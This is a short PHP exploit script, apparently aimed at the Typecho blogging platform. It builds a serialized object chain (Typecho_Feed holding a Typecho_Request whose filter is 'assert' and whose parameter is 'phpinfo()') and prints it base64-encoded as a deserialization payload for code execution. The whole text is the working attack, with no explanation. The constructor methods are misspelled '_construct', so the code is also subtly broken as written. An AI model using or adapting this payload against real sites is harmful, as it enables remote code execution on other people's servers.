/*exp.php*/
<?php
class Typecho_Feed
{
	private $item;
	public function _construct(){
		$this->item = array(
			'author'=>new Typecho_Request(),
		);
	}
}
class Typecho_Request
{
	private $_params = array();
	private $_filter = array();
	public function _construct(){
		$this->_params['screenName']='phpinfo()';
		$this->_filter[0]='assert';
	}
}
$exp = array(
	'adapter'=> new Typecho_Feed()
);
echo base64_encode(serialize($exp));
?>
